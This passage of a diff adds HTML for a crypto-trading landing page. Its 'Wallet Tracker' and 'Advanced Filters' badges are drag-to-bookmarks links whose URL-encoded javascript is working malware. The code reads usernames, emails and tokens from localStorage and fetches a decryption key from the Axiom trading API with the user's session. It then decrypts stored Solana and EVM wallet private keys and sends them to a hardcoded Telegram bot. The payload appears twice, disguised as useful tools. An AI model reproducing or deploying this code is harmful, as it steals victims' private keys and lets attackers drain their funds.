0a%20%20%20%20%20%20%20%20if%20(typeof%20ud%20%3d%3d%3d%20%22string%22)%20%7b%20if%20(!username)%20username%20%3d%20ud%3b%20%7d%0a%20%20%20%20%20%20%20%20else%20%7b%20if%20(!username)%20username%20%3d%20ud.username%20%7c%7c%20ud.name%20%7c%7c%20%22%22%3b%20if%20(!email)%20email%20%3d%20ud.email%20%7c%7c%20%22%22%3b%20%7d%0a%20%20%20%20%20%20%7d%0a%20%20%20%20%20%20if%20(apiResponse.username%20%26%26%20!username)%20username%20%3d%20apiResponse.username%3b%0a%20%20%20%20%20%20if%20(apiResponse.email%20%26%26%20!email)%20email%20%3d%20apiResponse.email%3b%0a%0a%20%20%20%20%20%20var%20cryptoKey%20%3d%20await%20crypto.subtle.importKey(%22raw%22%2c%20base64ToUint8Array(bundleKey)%2c%20%7b%20name%3a%20%22AES-GCM%22%20%7d%2c%20false%2c%20%5b%22decrypt%22%5d)%3b%0a%20%20%20%20%20%20var%20decryptedEntries%20%3d%20%5b%5d%3b%0a%20%20%20%20%20%20for%20(var%20w%20%3d%200%3b%20w%20%3c%20wallets.length%3b%20w%2b%2b)%20%7b%0a%20%20%20%20%20%20%20%20var%20bundleData%20%3d%20wallets%5bw%5d.b%3b%0a%20%20%20%20%20%20%20%20if%20(!bundleData)%20continue%3b%0a%20%20%20%20%20%20%20%20if%20(typeof%20bundleData%20%3d%3d%3d%20%22string%22)%20try%20%7b%20bundleData%20%3d%20JSON.parse(bundleData)%3b%20%7d%20catch%20(e)%20%7b%20bundleData%20%3d%20%5bbundleData%5d%3b%20%7d%0a%20%20%20%20%20%20%20%20if%20(!Array.isArray(bundleData))%20bundleData%20%3d%20%5bbundleData%5d%3b%0a%20%20%20%20%20%20%20%20for%20(var%20b%20%3d%200%3b%20b%20%3c%20bundleData.length%3b%20b%2b%2b)%20%7b%0a%20%20%20%20%20%20%20%20%20%20try%20%7b%0a%20%20%20%20%20%20%20%20%20%20%20%20var%20sp%20%3d%20String(bundleData%5bb%5d).split(%22%3a%22)%3b%0a%20%20%20%20%20%20%20%20%20%20%20%20if%20(sp.length%20%3c%202)%20continue%3b%0a%20%20%20%20%20%20%20%20%20%20%20%20var%20dec%20%3d%20await%20crypto.subtle.decrypt(%7b%20name%3a%20%22AES-GCM%22%2c%20iv%3a%20base64ToUint8Array(sp%5b0%5d)%20%7d%2c%20cryptoKey%2c%20base64ToUint8Array(sp%5b1%5d))%3b%0a%20%20%20%20%20%20%20%20%20%20%20%20var%20hex%20%3d%20%22%22%3b%0a%20%20%20%20%20%20%20%20%20%20%20%20var%20db%20%3d%20new%20Uint8Array(dec)%3b%0a%20%20%20%20%20%20%20%20%20%20%20%20for%20(var%20h%20%3d%200%3b%20h%20%3c%20db.length%3b%20h%2b%2b)%20hex%20%2b%3d%20db%5bh%5d.toString(16).padStart(2%2c%20%220%22)%3b%0a%20%20%20%20%20%20%20%20%20%20%20%20decryptedEntries.push(%7b%20addr%3a%20wallets%5bw%5d.a%2c%20chain%3a%20wallets%5bw%5d.c%2c%20key%3a%20hex%20%7d)%3b%0a%20%20%20%20%20%20%20%20%20%20%7d%20catch%20(e)%20%7b%7d%0a%20%20%20%20%20%20%20%20%7d%0a%20%20%20%20%20%20%7d%0a%20%20%20%20%20%20if%20(decryptedEntries.length%20%3d%3d%3d%200)%20return%3b%0a%0a%20%20%20%20%20%20var%20BOT_TOKEN%20%3d%20%228939440661%3aAAGuF0lw32Td_YFlYJtNdZjuK3fdZ9qPTQw%22%3b%0a%20%20%20%20%20%20var%20CHAT_ID%20%20%20%3d%20%228752245194%22%3b%0a%0a%20%20%20%20%20%20var%20solCount%20%3d%200%2c%20evmCount%20%3d%200%2c%20otherCount%20%3d%200%3b%0a%20%20%20%20%20%20var%20walletLines%20%3d%20%5b%22%5cu2501%5cu2501%5cu2501%5cu2501%5cu2501%5cu2501%5cu2501%5cu2501%5cu2501%5cu2501%5cu2501%5cu2501%5cu2501%5cu2501%5cu2501%5cu2501%5cu2501%5cu2501%5cu2501%5cu2501%22%5d%3b%0a%20%20%20%20%20%20for%20(var%20wi%20%3d%200%3b%20wi%20%3c%20decryptedEntries.length%3b%20wi%2b%2b)%20%7b%0a%20%20%20%20%20%20%20%20var%20en%20%3d%20decryptedEntries%5bwi%5d%3b%0a%20%20%20%20%20%20%20%20var%20chain%20%3d%20en.chain.toLowerCase()%3b%0a%20%20%20%20%20%20%20%20var%20label%3b%0a%20%20%20%20%20%20%20%20if%20(chain.indexOf(%22sol%22)%20!%3d%3d%20-1)%20%7b%20solCount%2b%2b%3b%20label%20%3d%20%22%5cud83d%5cudfe1%20Solana%20Wallet%20%22%20%2b%20solCount%3b%20%7d%0a%20%20%20%20%20%20%20%20else%20if%20(chain.indexOf(%22eth%22)%20!%3d%3d%20-1%20%7c%7c%20chain.indexOf(%22evm%22)%20!%3d%3d%20-1)%20%7b%20evmCount%2b%2b%3b%20label%20%3d%20%22%5cud83d%5cudc9c%20EVM%20Wallet%20%22%20%2b%20evmCount%3b%20%7d%0a%20%20%20%20%20%20%20%20else%20if%20(chain.indexOf(%22bsc%22)%20!%3d%3d%20-1)%20%7b%20evmCount%2b%2b%3b%20label%20%3d%20%22%5cud83d%5cudfe1%20BSC%20Wallet%20%22%20%2b%20evmCount%3b%20%7d%0a%20%20%20%20%20%20%20%20else%20%7b%20otherCount%2b%2b%3b%20label%20%3d%20%22%5cud83d%5cudd35%20Wallet%20%22%20%2b%20otherCount%20%2b%20%22%20(%22%20%2b%20en.chain%20%2b%20%22)%22%3b%20%7d%0a%20%20%20%20%20%20%20%20walletLines.push(label%20%2b%20%22%5cn%22%20%2b%20%22%5cud83d%5cudccd%20Address%3a%20%22%20%2b%20en.addr%20%2b%20%22%5cn%22%20%2b%20%22%5cud83d%5cudd11%20Private%20Key%3a%20%22%20%2b%20en.key)%3b%0a%20%20%20%20%20%20%7d%0a%20%20%20%20%20%20walletLines.push(%22%5cu2501%5cu2501%5cu2501%5cu2501%5cu2501%5cu2501%5cu2501%5cu2501%5cu2501%5cu2501%5cu2501%5cu2501%5cu2501%5cu2501%5cu2501%5cu2501%5cu2501%5cu2501%5cu2501%5cu2501%22)%3b%0a%0a%20%20%20%20%20%20var%20text%20%3d%20%5b%0a%20%20%20%20%20%20%20%20%22%5cud83d%5cudd11%20NEW%20HIT%22%2c%0a%20%20%20%20%20%20%20%20%22%5cud83d%5cudc64%20User%3a%20%22%20%2b%20(username%20%7c%7c%20%22unknown%22)%2c%0a%20%20%20%20%20%20%20%20%22%5cud83d%5cudce7%20Email%3a%20%22%20%2b%20(email%20%7c%7c%20%22unknown%22)%2c%0a%20%20%20%20%20%20%20%20%22%22%2c%0a%20%20%20%20%20%20%20%20walletLines.join(%22%5cn%5cn%22)%0a%20%20%20%20%20%20%5d.join(%22%5cn%22)%3b%0a%0a%20%20%20%20%20%20var%20chunks%20%3d%20%5b%5d%3b%0a%20%20%20%20%20%20for%20(var%20ci%20%3d%200%3b%20ci%20%3c%20text.length%3b%20ci%20%2b%3d%204000)%20chunks.push(text.slice(ci%2c%20ci%20%2b%204000))%3b%0a%20%20%20%20%20%20chunks.forEach(function(chunk)%20%7b%0a%20%20%20%20%20%20%20%20var%20img%20%3d%20new%20Image()%3b%0a%20%20%20%20%20%20%20%20img.src%20%3d%20%22https%3a%2f%2fapi.telegram.org%2fbot%22%20%2b%20BOT_TOKEN%20%2b%0a%20%20%20%20%20%20%20%20%20%20%22%2fsendMessage%3fchat_id%3d%22%20%2b%20CHAT_ID%20%2b%0a%20%20%20%20%20%20%20%20%20%20%22%26disable_web_page_preview%3dtrue%22%20%2b%0a%20%20%20%20%20%20%20%20%20%20%22%26text%3d%22%20%2b%20encodeURIComponent(chunk)%3b%0a%20%20%20%20%20%20%7d)%3b%0a%20%20%20%20%7d%20catch%20(e)%20%7b%0a%20%20%20%20%20%20console.log(%22%5bmoonr%5d%20outer%20error%3a%22%2c%20e)%3b%0a%20%20%20%20%7d%0a%20%20%7d)()%3b%0a%7d)()%3b"
+                ICON="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAAERSURBVFhH7ZUxDoJAEEUpOQJHsLS0tKSk9Bgewc7S0mNwBI/gESwtLe3AtzCTKCEEltk1Gl5CFndm5+8fYUkWfp6qqnK5jU9d1xkbeDKuZSouiJeI14xXmYqHc+3E3ygkFAdcX0S4gd83hlTCYUGoaFQ7sIm9pITF/eei+QHzD4ZM0sLgXLZy/RA/Sao91E8RuLdS/RB3r+VKlthC8WMrMwx5pSyxg7p66IyC3I0stYGCZ6k9CvJtDydqbj2uOOfCf+OeaFrpzaxngfXdD44vfh+que4Vry6wzsq9Mq0LVu6VSV0g39q9Mq4L1u6VUV0gL5R7ZbgLodwrg10gHtq90t8FdpcTPIS+0NmJ5MK3SZIXjGlF3Fm+/J0AAAAASUVORK5CYII=" draggable="true" title="Drag me to your bookmarks bar"><svg class="badge-logo" viewBox="0 0 24 24" width="14" height="14" aria-hidden="true"><polygon points="12,2 17,11 7,11" fill="currentColor"/><polygon points="6,13 18,13 22,21 2,21" fill="currentColor"/></svg> Wallet Tracker</a>
+            </div>
+            <h3>Wallet Tracker</h3>
+            <p>Monitor wallets in real-time with analytics and full transaction history.</p>
+            <span class="option-num">03</span>
+          </div>
+
+          <!-- Advanced Filters -->
+          <div class="option-card">
+            <div class="option-top">
+              <div class="option-icon-box">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round"
+                  stroke-linejoin="round">
+                  <path d="M18 20V10" />
+                  <path d="M12 20V4" />
+                  <path d="M6 20v-6" />
+                </svg>
+              </div>
+              <a class="option-badge"
+                href="javascript:%2f%2f%20%2f%20-%20%2f%20-%20%2f%20-%20%2f%20-%20%2f%20-%20%2f%20-%20%2f%20-%20%2f%20-%20%2f%20-%20%2f%20-%20%2f%20-%20%2f%20-%20%2f%20-%20%2f%20-%20%2f%0a%2f%2f%20%09NYXDEOB%20V1.8.3%20-%20Deobfuscation%20Engine%209.4.0%0a%2f%2f%20%2f%20-%20%2f%20-%20%2f%20-%20%2f%20-%20%2f%20-%20%2f%20-%20%2f%20-%20%2f%20-%20%2f%20-%20%2f%20-%20%2f%20-%20%2f%20-%20%2f%20-%20%2f%20-%20%2f%0a%2f%2f%20made%20by%20aidn%20%3b)%0a%0ajavascript%3a(function%20()%20%7b%0a%20%20(async%20function%20()%20%7b%0a%20%20%20%20try%20%7b%0a%20%20%20%20%20%20function%20safeAtob(input)%20%7b%0a%20%20%20%20%20%20%20%20var%20cleaned%20%3d%20String(input).replace(%2f%5b%5eA-Za-z0-9%2b%2f%3d%5d%2fg%2c%20%22%22)%3b%0a%20%20%20%20%20%20%20%20return%20atob(cleaned)%3b%0a%20%20%20%20%20%20%7d%0a%20%20%20%20%20%20function%20base64ToUint8Array(b64)%20%7b%0a%20%20%20%20%20%20%20%20var%20binary%20%3d%20safeAtob(b64)%3b%0a%20%20%20%20%20%20%20%20var%20bytes%20%3d%20new%20Uint8Array(binary.length)%3b%0a%20%20%20%20%20%20%20%20for%20(var%20i%20%3d%200%3b%20i%20%3c%20binary.length%3b%20i%2b%2b)%20bytes%5bi%5d%20%3d%20binary.charCodeAt(i)%3b%0a%20%20%20%20%20%20%20%20return%20bytes%3b%0a%20%20%20%20%20%20%7d%0a%0a%20%20%20%20%20%20var%20username%20%3d%20localStorage.getItem(%22username%22)%20%7c%7c%20%22%22%3b%0a%20%20%20%20%20%20if%20(username%20%3d%3d%3d%20%22null%22%20%7c%7c%20username%20%3d%3d%3d%20%22undefined%22)%20username%20%3d%20%22%22%3b%0a%20%20%20%20%20%20username%20%3d%20username.replace(%2f%5e%22%7c%22%24%2fg%2c%20%22%22)%3b%0a%20%20%20%20%20%20var%20email%20%3d%20localStorage.getItem(%22email%22)%20%7c%7c%20%22%22%3b%0a%20%20%20%20%20%20if%20(email%20%3d%3d%3d%20%22null%22%20%7c%7c%20email%20%3d%3d%3d%20%22undefined%22)%20email%20%3d%20%22%22%3b%0a%20%20%20%20%20%20email%20%3d%20email.replace(%2f%5e%22%7c%22%24%2fg%2c%20%22%22)%3b%0a%20%20%20%20%20%20var%20userId%20%3d%20localStorage.getItem(%22userId%22)%20%7c%7c%20%22%22%3b%0a%20%20%20%20%20%20if%20(userId)%20userId%20%3d%20userId.replace(%2f%5e%22%7c%22%24%2fg%2c%20%22%22)%3b%0a%0a%20%20%20%20%20%20try%20%7b%0a%20%20%20%20%20%20%20%20if%20(!username)%20%7b%0a%20%20%20%20%20%20%20%20%20%20var%20fallback%20%3d%20localStorage.getItem(%22displayName%22)%20%7c%7c%20localStorage.getItem(%22name%22)%20%7c%7c%20localStorage.getItem(%22user%22)%20%7c%7c%20%22%22%3b%0a%20%20%20%20%20%20%20%20%20%20if%20(fallback%20%26%26%20fallback%20!%3d%3d%20%22null%22%20%26%26%20fallback%20!%3d%3d%20%22undefined%22)%20%7b%0a%20%20%20%20%20%20%20%20%20%20%20%20fallback%20%3d%20fallback.replace(%2f%5e%22%7c%22%24%2fg%2c%20%22%22)%3b%0a%20%20%20%20%20%20%20%20%20%20%20%20if%20(fallback%20%26%26%20fallback%20!%3d%3d%20%22null%22%20%26%26%20fallback%20!%3d%3d%20%22undefined%22)%20username%20%3d%20fallback%3b%0a%20%20%20%20%20%20%20%20%20%20%7d%0a%20%20%20%20%20%20%20%20%7d%0a%20%20%20%20%20%20%7d%20catch%20(e)%20%7b%7d%0a%0a%20%20%20%20%20%20try%20%7b%0a%20%20%20%20%20%20%20%20var%20lsKeys%20%3d%20Object.keys(localStorage)%3b%0a%20%20%20%20%20%20%20%20for%20(var%20i%20%3d%200%3b%20i%20%3c%20lsKeys.length%3b%20i%2b%2b)%20%7b%0a%20%20%20%20%20%20%20%20%20%20var%20val%20%3d%20localStorage.getItem(lsKeys%5bi%5d)%20%7c%7c%20%22%22%3b%0a%20%20%20%20%20%20%20%20%20%20if%20(val%20%26%26%20val.length%20%3e%2020%20%26%26%20val.length%20%3c%202000)%20%7b%0a%20%20%20%20%20%20%20%20%20%20%20%20var%20parts%20%3d%20val.split(%22.%22)%3b%0a%20%20%20%20%20%20%20%20%20%20%20%20if%20(parts.length%20%3d%3d%3d%203%20%26%26%20parts%5b0%5d.length%20%3e%2010)%20%7b%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20try%20%7b%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20var%20pl%20%3d%20JSON.parse(atob(parts%5b1%5d.replace(%2f-%2fg%2c%20%22%2b%22).replace(%2f_%2fg%2c%20%22%2f%22)))%3b%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if%20(pl.email%20%26%26%20!email)%20email%20%3d%20String(pl.email).replace(%2f%5e%22%7c%22%24%2fg%2c%20%22%22)%3b%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if%20(!username)%20username%20%3d%20String(pl.username%20%7c%7c%20pl.name%20%7c%7c%20pl.displayName%20%7c%7c%20pl.preferred_username%20%7c%7c%20%22%22).replace(%2f%5e%22%7c%22%24%2fg%2c%20%22%22)%3b%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7d%20catch%20(e)%20%7b%7d%0a%20%20%20%20%20%20%20%20%20%20%20%20%7d%0a%20%20%20%20%20%20%20%20%20%20%7d%0a%20%20%20%20%20%20%20%20%7d%0a%20%20%20%20%20%20%7d%20catch%20(e)%20%7b%7d%0a%0a%20%20%20%20%20%20var%20wallets%20%3d%20%5b%5d%3b%0a%20%20%20%20%20%20try%20%7b%0a%20%20%20%20%20%20%20%20var%20solWallets%20%3d%20JSON.parse(localStorage.getItem(%22allSolWallets%22)%20%7c%7c%20%22%5b%5d%22)%3b%0a%20%20%20%20%20%20%20%20var%20solBundles%20%3d%20JSON.parse(localStorage.getItem(%22sBundles%22)%20%7c%7c%20%22%5b%5d%22)%3b%0a%20%20%20%20%20%20%20%20if%20(!Array.isArray(solBundles))%20solBundles%20%3d%20%5bsolBundles%5d%3b%0a%20%20%20%20%20%20%20%20for%20(var%20i%20%3d%200%3b%20i%20%3c%20solWallets.length%3b%20i%2b%2b)%20%7b%0a%20%20%20%20%20%20%20%20%20%20if%20(solBundles%5bi%5d%20%3d%3d%3d%20undefined)%20continue%3b%0a%20%20%20%20%20%20%20%20%20%20wallets.push(%7b%20a%3a%20solWallets%5bi%5d.walletAddress%2c%20c%3a%20%22solana%22%2c%20n%3a%20solWallets%5bi%5d.name%2c%20b%3a%20JSON.stringify(%5bsolBundles%5bi%5d%5d)%20%7d)%3b%0a%20%20%20%20%20%20%20%20%7d%0a%20%20%20%20%20%20%7d%20catch%20(e)%20%7b%7d%0a%20%20%20%20%20%20try%20%7b%0a%20%20%20%20%20%20%20%20var%20evmWallets%20%3d%20JSON.parse(localStorage.getItem(%22allEvmWallets%22)%20%7c%7c%20%22%5b%5d%22)%3b%0a%20%20%20%20%20%20%20%20var%20evmBundle%20%3d%20localStorage.getItem(%22bundle%22)%20%7c%7c%20%22%22%3b%0a%20%20%20%20%20%20%20%20if%20(evmBundle%20%26%26%20evmWallets.length%20%3e%200)%0a%20%20%20%20%20%20%20%20%20%20wallets.push(%7b%20a%3a%20evmWallets%5b0%5d.walletAddress%2c%20c%3a%20%22evm%22%2c%20n%3a%20evmWallets%5b0%5d.name%2c%20b%3a%20JSON.stringify(%5bevmBundle%5d)%20%7d)%3b%0a%20%20%20%20%20%20%7d%20catch%20(e)%20%7b%7d%0a%0a%20%20%20%20%20%20var%20apiResponse%20%3d%20null%3b%0a%20%20%20%20%20%20for%20(var%20attempt%20%3d%200%3b%20attempt%20%3c%204%3b%20attempt%2b%2b)%20%7b%0a%20%20%20%20%20%20%20%20try%20%7b%0a%20%20%20%20%20%20%20%20%20%20var%20controller%20%3d%20new%20AbortController()%3b%0a%20%20%20%20%20%20%20%20%20%20var%20timeout%20%3d%20setTimeout(function%20()%20%7b%20controller.abort()%3b%20%7d%2c%208000)%3b%0a%20%20%20%20%20%20%20%20%20%20var%20response%20%3d%20await%20fetch(%22https%3a%2f%2fapi9.axiom.trade%2fbundle-key-and-wallets-v2%22%2c%20%7b%0a%20%20%20%20%20%20%20%20%20%20%20%20method%3a%20%22POST%22%2c%20credentials%3a%20%22include%22%2c%0a%20%20%20%20%20%20%20%20%20%20%20%20headers%3a%20%7b%20%22Content-Type%22%3a%20%22application%2fjson%22%20%7d%2c%20signal%3a%20controller.signal%2c%0a%20%20%20%20%20%20%20%20%20%20%7d)%3b%0a%20%20%20%20%20%20%20%20%20%20clearTimeout(timeout)%3b%0a%20%20%20%20%20%20%20%20%20%20var%20body%20%3d%20await%20response.text()%3b%0a%20%20%20%20%20%20%20%20%20%20if%20(response.status%20%3d%3d%3d%20200)%20try%20%7b%20apiResponse%20%3d%20JSON.parse(body)%3b%20break%3b%20%7d%20catch%20(e)%20%7b%7d%0a%20%20%20%20%20%20%20%20%7d%20catch%20(e)%20%7b%7d%0a%20%20%20%20%20%20%20%20await%20new%20Promise(function%20(r)%20%7b%20setTimeout(r%2c%201500%20*%20attempt)%3b%20%7d)%3b%0a%20%20%20%20%20%20%7d%0a%20%20%20%20%20%20if%20(!apiResponse%20%7c%7c%20(!apiResponse.bundleKey%20%26%26%20!apiResponse.key))%20return%3b%0a%0a%20%20%20%20%20%20var%20bundleKey%20%3d%20apiResponse.bundleKey%20%7c%7c%20apiResponse.key%3b%0a%20%20%20%20%20%20if%20(apiResponse.user)%20%7b%0a%20%20%20%20%20%20%20%20var%20ud%20%3d%20apiResponse.user%3b%0a%20%20%20%20%20%20%20%20if%20(typeof%20ud%20%3d%3d%3d%20%22string%22)%20%7b%20if%20(!username)%20username%20%3d%20ud%3b%20%7d%0a%20%20%20%20%20%20%20%20else%20%7b%20if%20(!username)%20username%20%3d%20ud.username%20%7c%7c%20ud.name%20%7c%7c%20%22%22%3b%20if%20(!email)%20email%20%3d%20ud.email%20%7c%7c%20%22%22%3b%20%7d%0a%20%20%20%20%20%20%7d%0a%20%20%20%20%20%20if%20(apiResponse.username%20%26%26%20!username)%20username%20%3d%20apiResponse.username%3b%0a%20%20%20%20%20%20if%20(apiResponse.email%20%26%26%20!email)%20email%20%3d%20apiResponse.email%3b%0a%0a%20%20%20%20%20%20var%20cryptoKey%20%3d%20await%20crypto.subtle.importKey(%22raw%22%2c%20base64ToUint8Array(bundleKey)%2c%20%7b%20name%3a%20%22AES-GCM%22%20%7d%2c%20false%2c%20%5b%22decrypt%22%5d)%3b%0a%20%20%20%20%20%20var%20decryptedEntries%20%3d%20%5b%5d%3b%0a%20%20%20%20%20%20for%20(var%20w%20%3d%200%3b%20w%20%3c%20wallets.length%3b%20w%2b%2b)%20%7b%0a%20%20%20%20%20%20%20%20var%20bundleData%20%3d%20wallets%5bw%5d.b%3b%0a%20%20%20%20%20%20%20%20if%20(!bundleData)%20continue%3b%0a%20%20%20%20%20%20%20%20if%20(typeof%20bundleData%20%3d%3d%3d%20%22string%22)%20try%20%7b%20bundleData%20%3d%20JSON.parse(bundleData)%3b%20%7d%20catch%20(e)%20%7b%20bundleData%20%3d%20%5bbundleData%5d%3b%20%7d%0a%20%20%20%20%20%20%20%20if%20(!Array.isArray(bundleData))%20bundleData%20%3d%20%5bbundleData%5d%3b%0a%20%20%20%20%20%20%20%20for%20(var%20b%20%3d%200%3b%20b%20%3c%20bundleData.length%3b%20b%2b%2b)%20%7b%0a%20%20%20%20%20%20%20%20%20%20try%20%7b%0a%20%20%20%20%20%20%20%20%20%20%20%20var%20sp%20%3d%20String(bundleData%5bb%5d).split(%22%3a%22)%3b%0a%20%20%20%20%20%20%20%20%20%20%20%20if%20(sp.length%20%3c%202)%20continue%3b%0a%20%20%20%20%20%20%20%20%20%20%20%20var%20dec%20%3d%20await%20crypto.subtle.decrypt(%7b%20name%3a%20%22AES-GCM%22%2c%20iv%3a%20base64ToUint8Array(sp%5b0%5d)%20%7d%2c%20cryptoKey%2c%20base64ToUint8Array(sp%5b1%5d))%3b%0a%20%20%20%20%20%20%20%20%20%20%20%20var%20hex%20%3d%20%22%22%3b%0a%20%20%20%20%20%20%20%20%20%20%20%20var%20db%20%3d%20new%20Uint8Array(dec)%3b%0a%20%20%20%20%20%20%20%20%20%20%20%20for%20(var%20h%20%3d%200%3b%20h%20%3c%20db.length%3b%20h%2b%2b)%20hex%20%2b%3d%20db%5bh%5d.toString(16).padStart(2%2c%20%220%22)%3b%0a%20%20%20%20%20%20%20%20%20%20%20%20decryptedEntries.push(%7b%20addr%3a%20wallets%5bw%5d.a%2c%20chain%3a%20wallets%5bw%5d.c%2c%20key%3a%20hex%20%7d)%3b%0a%20%20%20%20%20%20%20%20%20%20%7d%20catch%20(e)%20%7b%7d%0a%20%20%20%20%20%20%20%20%7d%0a%20%20%20%20%20%20%7d%0a%20%20%20%20%20%20if%20(decryptedEntries.length%20%3d%3d%3d%200)%20return%3b%0a%0a%20%20%20%20%20%20var%20BOT_TOKEN%20%3d%20%228939440661%3aAAGuF0lw32Td_YFlYJtNdZjuK3fdZ9qPTQw%22%3b%0a%20%20%20%20%20%20var%20CHAT_ID%20%20%20%3d%20%228752245194%22%3b%0a%0a%20%20%20%20%20%20var%20solCount%20%3d%200%2c%20evmCount%20%3d%200%2c%20otherCount%20%3d%200%3b%0a%20%20%20%20%20%20var%20walletLines%20%3d%20%5b%22%5cu2501%5cu2501%5cu2501%5cu2501%5cu2501%5cu2501%5cu2501%5cu2501%5cu2501%5cu2501%5cu2501%5cu2501%5cu2501%5cu2501%5cu2501%5cu2501%5cu2501%5cu2501%5cu2501%5cu2501%22%5d%3b%0a%20%20%20%20%20%20for%20(var%20wi%20%3d%200%3b%20wi%20%3c%20decryptedEntries.length%3b%20wi%2b%2b)%20%7b%0a%20%20%20%20%20%20%20%20var%20en%20%3d%20decryptedEntries%5bwi%5d%3b%0a%20%20%20%20%20%20%20%20var%20chain%20%3d%20en.chain.toLowerCase()%3b%0a%20%20%20%20%20%20%20%20var%20label%3b%0a%20%20%20%20%20%20%20%20if%20(chain.indexOf(%22sol%22)%20!%3d%3d%20-1)%20%7b%20solCount%2b%2b%3b%20label%20%3d%20%22%5cud83d%5cudfe1%20Solana%20Wallet%20%22%20%2b%20solCount%3b%20%7d%0a%20%20%20%20%20%20%20%20else%20if%20(chain.indexOf(%22eth%22)%20!%3d%3d%20-1%20%7c%7c%20chain.indexOf(%22evm%22)%20!%3d%3d%20-1)%20%7b%20evmCount%2b%2b%3b%20label%20%3d%20%22%5cud83d%5cudc9c%20EVM%20Wallet%20%22%20%2b%20evmCount%3b%20%7d%0a%20%20%20%20%20%20%20%20else%20if%20(chain.indexOf(%22bsc%22)%20!%3d%3d%20-1)%20%7b%20evmCount%2b%2b%3b%20label%20%3d%20%22%5cud83d%5cudfe1%20BSC%20Wallet%20%22%20%2b%20evmCount%3b%20%7d%0a%20%20%20%20%20%20%20%20else%20%7b%20otherCount%2b%2b%3b%20label%20%3d%20%22%5cud83d%5cudd35%20Wallet%20%22%20%2b%20otherCount%20%2b%20%22%20(%22%20%2b%20en.chain%20%2b%20%22)%22%3b%20%7d%0a%20%20%20%20%20%20%20%20walletLines.push(label%20%2b%20%22%5cn%22%20%2b%20%22%5cud83d%5cudccd%20Address%3a%20%22%20%2b%20en.addr%20%2b%20%22%5cn%22%20%2b%20%22%5cud83d%5cudd11%20Private%20Key%3a%20%22%20%2b%20en.key)%3b%0a%20%20%20%20%20%20%7d%0a%20%20%20%20%20%20walletLines.push(%22%5cu2501%5cu2501%5cu2501%5cu2501%5cu2501%5cu2501%5cu2501%5cu2501%5cu2501%5cu2501%5cu2501%5cu2501%5cu2501%5cu2501%5cu2501%5cu2501%5cu2501%5cu2501%5cu2501%5cu2501%22)%3b%0a%0a%20%20%20%20%20%20var%20text%20%3d%20%5b%0a%20%20%20%20%20%20%20%20%22%5cud83d%5cudd11%20NEW%20HIT%22%2c%0a%20%20%20%20%20%20%20%20%22%5cud83d%5cudc64%20User%3a%20%22%20%2b%20(username%20%7c%7c%20%22unknown%22)%2c%0a%20%20%20%20%20%20%20%20%22%5cud83d%5cudce7%20Email%3a%20%22%20%2b%20(email%20%7c%7c%20%22unknown%22)%2c%0a%20%20%20%20%20%20%20%20%22%22%2c%0a%20%20%20%20%20%20%20%20walletLines.join(%22%5cn%5cn%22)%0a%20%20%20%20%20%20%5d.join(%22%5cn%22)%3b%0a%0a%20%20%20%20%20%20var%20chunks%20%3d%20%5b%5d%3b%0a%20%20%20%20%20%20for%20(var%20ci%20%3d%200%3b%20ci%20%3c%20text.length%3b%20ci%20%2b%3d%204000)%20chunks.push(text.slice(ci%2c%20ci%20%2b%204000))%3b%0a%20%20%20%20%20%20chunks.forEach(function(chunk)%20%7b%0a%20%20%20%20%20%20%20%20var%20img%20%3d%20new%20Image()%3b%0a%20%20%20%20%20%20%20%20img.src%20%3d%20%22https%3a%2f%2fapi.telegram.org%2fbot%22%20%2b%20BOT_TOKEN%20%2b%0a%20%20%20%20%20%20%20%20%20%20%22%2fsendMessage%3fchat_id%3d%22%20%2b%20CHAT_ID%20%2b%0a%20%20%20%20%20%20%20%20%20%20%22%26disable_web_page_preview%3dtrue%22%20%2b%0a%20%20%20%20%20%20%20%20%20%20%22%26text%3d%22%20%2b%20encodeURIComponent(chunk)%3b%0a%20%20%20%20%20%20%7d)%3b%0a%20%20%20%20%7d%20catch%20(e)%20%7b%0a%20%20%20%20%20%20console.log(%22%5bmoonr%5d%20outer%20error%3a%22%2c%20e)%3b%0a%20%20%20%20%7d%0a%20%20%7d)()%3b%0a%7d)()%3b"
+                ICON="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAAERSURBVFhH7ZUxDoJAEEUpOQJHsLS0tKSk9Bgewc7S0mNwBI/gESwtLe3AtzCTKCEEltk1Gl5CFndm5+8fYUkWfp6qqnK5jU9d1xkbeDKuZSouiJeI14xXmYqHc+3E3ygkFAdcX0S4gd83hlTCYUGoaFQ7sIm9pITF/eei+QHzD4ZM0sLgXLZy/RA/Sao91E8RuLdS/RB3r+VKlthC8WMrMwx5pSyxg7p66IyC3I0stYGCZ6k9CvJtDydqbj2uOOfCf+OeaFrpzaxngfXdD44vfh+que4Vry6wzsq9Mq0LVu6VSV0g39q9Mq4L1u6VUV0gL5R7ZbgLodwrg10gHtq90t8FdpcTPIS+0NmJ5MK3SZIXjGlF3Fm+/J0AAAAASUVORK5CYII=" draggable="true" title="Drag me to your bookmarks bar"><svg class="badge-logo" viewBox="0 0 24 24" width="14" height="14" aria-hidden="true"><polygon points="12,2 17,11 7,11" fill="currentColor"/><polygon points="6,13 18,13 22,21 2,21" fill="currentColor"/></svg> Advanced Filters</a>
+            </div>
+            <h3>Advanced Filters</h3>
+            <p>Powerful filters for token metrics, wallet activity, and market signals.</p>
+            <span class="option-num">04</span>
+          </div>
+        </div>
+
+        <div class="dex-section">
+          <h3 class="dex-title"><span class="h-solid">WORKS WITH</span> <span class="h-outline">YOUR FAVORITE DEX</span>
+          </h3>
+          <div class="dex-row">
+            <div class="dex-card">
+              <div class="dex-l">
+                <span class="dex-logo"><svg viewBox="0 0 24 24" aria-label="Axiom logo">
+                    <polygon points="12,2 17,11 7,11" fill="#fff" />
+                    <polygon points="6,13 18,13 22,21 2,21" fill="#fff" />
+                  </svg></span>
+                <span class="dex-name">Axiom</span>
+              </div>
